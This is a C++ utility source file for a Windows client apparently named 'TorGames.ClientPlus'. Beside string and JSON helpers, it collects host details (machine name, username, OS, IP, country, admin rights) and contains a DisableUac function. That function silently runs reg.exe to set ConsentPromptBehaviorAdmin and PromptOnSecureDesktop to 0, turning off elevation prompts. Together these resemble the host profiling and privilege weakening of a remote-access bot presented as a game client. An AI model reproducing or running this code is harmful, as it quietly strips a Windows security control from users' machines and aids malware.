// TorGames.ClientPlus - Utility functions implementation
#include "utils.h"
#include "logger.h"
#include <algorithm>
#include <sstream>

namespace Utils {

std::string ToLower(const std::string& str) {
    std::string result = str;
    std::transform(result.begin(), result.end(), result.begin(), ::tolower);
    return result;
}

std::string Trim(const std::string& str) {
    size_t start = str.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    size_t end = str.find_last_not_of(" \t\r\n");
    return str.substr(start, end - start + 1);
}

std::vector<std::string> Split(const std::string& str, char delimiter) {
    std::vector<std::string> tokens;
    std::stringstream ss(str);
    std::string token;
    while (std::getline(ss, token, delimiter)) {
        tokens.push_back(token);
    }
    return tokens;
}

std::string JsonEscape(const std::string& str) {
    std::string result;
    result.reserve(str.size() * 2);
    for (char c : str) {
        switch (c) {
            case '"': result += "\\\""; break;
            case '\\': result += "\\\\"; break;
            case '\n': result += "\\n"; break;
            case '\r': result += "\\r"; break;
            case '\t': result += "\\t"; break;
            default: result += c; break;
        }
    }
    return result;
}

// Decode unicode escapes like \u0022 to their actual characters
std::string DecodeUnicodeEscapes(const std::string& str) {
    std::string result;
    result.reserve(str.size());

    for (size_t i = 0; i < str.size(); i++) {
        if (str[i] == '\\' && i + 5 < str.size() && str[i + 1] == 'u') {
            // Parse 4 hex digits
            char hex[5] = {str[i + 2], str[i + 3], str[i + 4], str[i + 5], 0};
            int codepoint = strtol(hex, nullptr, 16);
            if (codepoint > 0 && codepoint < 128) {
                result += static_cast<char>(codepoint);
                i += 5; // Skip \uXXXX (loop will add 1 more)
                continue;
            }
        }
        result += str[i];
    }
    return result;
}

std::string JsonGetString(const char* json, const char* key) {
    // First try to decode unicode escapes in the JSON
    std::string decoded = DecodeUnicodeEscapes(json);
    const char* jsonStr = decoded.c_str();

    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":\"", key);
    const char* start = strstr(jsonStr, pattern);
    if (!start) return "";
    start += strlen(pattern);
    const char* end = strchr(start, '"');
    if (!end) return "";
    return std::string(start, end - start);
}

long long JsonGetInt(const char* json, const char* key) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
    const char* start = strstr(json, pattern);
    if (!start) return 0;
    start += strlen(pattern);
    return atoll(start);
}

bool JsonGetBool(const char* json, const char* key) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":true", key);
    return strstr(json, pattern) != nullptr;
}

std::string GetMachineName() {
    char buf[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size)) return buf;
    return "UNKNOWN";
}

std::string GetUsername() {
    char buf[256];
    DWORD size = sizeof(buf);
    if (GetUserNameA(buf, &size)) return buf;
    return "UNKNOWN";
}

std::string GetOsVersion() {
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        auto fn = reinterpret_cast<RtlGetVersionPtr>(GetProcAddress(ntdll, "RtlGetVersion"));
        if (fn) {
            RTL_OSVERSIONINFOW v = {sizeof(v)};
            if (fn(&v) == 0) {
                char buf[64];
                snprintf(buf, sizeof(buf), "Windows %lu.%lu.%lu",
                    v.dwMajorVersion, v.dwMinorVersion, v.dwBuildNumber);
                return buf;
            }
        }
    }
    return "Windows";
}

std::string GetArchitecture() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
        case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
        default: return "x86";
    }
}

int GetCpuCount() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors;
}

long long GetTotalMemory() {
    MEMORYSTATUSEX m = {sizeof(m)};
    GlobalMemoryStatusEx(&m);
    return m.ullTotalPhys;
}

long long GetAvailableMemory() {
    MEMORYSTATUSEX m = {sizeof(m)};
    GlobalMemoryStatusEx(&m);
    return m.ullAvailPhys;
}

std::string GetLocalIp() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        struct hostent* h = gethostbyname(hostname);
        if (h && h->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, h->h_addr_list[0], sizeof(addr));
            return inet_ntoa(addr);
        }
    }
    return "0.0.0.0";
}

std::string GetCountryCode() {
    // Use GetUserGeoID and GetGeoInfoA to get the 2-letter ISO country code
    GEOID geoId = GetUserGeoID(GEOCLASS_NATION);
    if (geoId == GEOID_NOT_AVAILABLE) {
        return "";
    }

    char countryCode[16] = {0};
    int len = GetGeoInfoA(geoId, GEO_ISO2, countryCode, sizeof(countryCode), 0);
    if (len > 0) {
        // Convert to lowercase
        for (int i = 0; countryCode[i]; i++) {
            if (countryCode[i] >= 'A' && countryCode[i] <= 'Z') {
                countryCode[i] = countryCode[i] + ('a' - 'A');
            }
        }
        return countryCode;
    }
    return "";
}

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

bool IsUacEnabled() {
    HKEY hKey;
    DWORD value = 1;
    DWORD size = sizeof(value);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "EnableLUA", nullptr, nullptr, reinterpret_cast<LPBYTE>(&value), &size);
        RegCloseKey(hKey);
    }
    return value != 0;
}

std::string Sha256(const std::string& input) {
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_HASH_HANDLE hash = nullptr;
    BYTE hashBytes[32];
    char result[65] = {0};

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0) == 0) {
        if (BCryptCreateHash(alg, &hash, nullptr, 0, nullptr, 0, 0) == 0) {
            BCryptHashData(hash, reinterpret_cast<PUCHAR>(const_cast<char*>(input.c_str())),
                static_cast<ULONG>(input.size()), 0);
            BCryptFinishHash(hash, hashBytes, 32, 0);
            BCryptDestroyHash(hash);
        }
        BCryptCloseAlgorithmProvider(alg, 0);
    }

    for (int i = 0; i < 32; i++) {
        sprintf(result + i * 2, "%02x", hashBytes[i]);
    }
    return result;
}

bool FileExists(const char* path) {
    DWORD attr = GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

bool DirectoryExists(const char* path) {
    DWORD attr = GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

bool CreateDirectoryRecursive(const char* path) {
    char tmp[MAX_PATH];
    strncpy(tmp, path, MAX_PATH - 1);
    tmp[MAX_PATH - 1] = '\0';

    for (char* p = tmp + 3; *p; p++) {
        if (*p == '\\' || *p == '/') {
            *p = '\0';
            CreateDirectoryA(tmp, nullptr);
            *p = '\\';
        }
    }
    return CreateDirectoryA(tmp, nullptr) || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool DisableUac() {
    if (!IsRunningAsAdmin()) {
        LOG_INFO("Cannot disable UAC - not running as admin");
        return false;
    }

    LOG_INFO("Disabling UAC prompts...");

    // Disable UAC consent prompt for administrators
    // ConsentPromptBehaviorAdmin = 0 means elevate without prompting
    int result1 = system("reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1");

    // Disable secure desktop for UAC prompts
    int result2 = system("reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1");

    if (result1 == 0 && result2 == 0) {
        LOG_INFO("UAC prompts disabled successfully");
        return true;
    }

    LOG_ERROR("Failed to disable UAC prompts");
    return false;
}

bool IsUacDisabled() {
    HKEY hKey;
    DWORD consentBehavior = 1;  // Default is 1 (prompt)
    DWORD promptOnSecureDesktop = 1;  // Default is 1 (enabled)
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "ConsentPromptBehaviorAdmin", nullptr, nullptr,
            reinterpret_cast<LPBYTE>(&consentBehavior), &size);
        size = sizeof(DWORD);
        RegQueryValueExA(hKey, "PromptOnSecureDesktop", nullptr, nullptr,
            reinterpret_cast<LPBYTE>(&promptOnSecureDesktop), &size);
        RegCloseKey(hKey);
    }

    // UAC is considered disabled if ConsentPromptBehaviorAdmin = 0 and PromptOnSecureDesktop = 0
    return (consentBehavior == 0 && promptOnSecureDesktop == 0);
}

} // namespace Utils
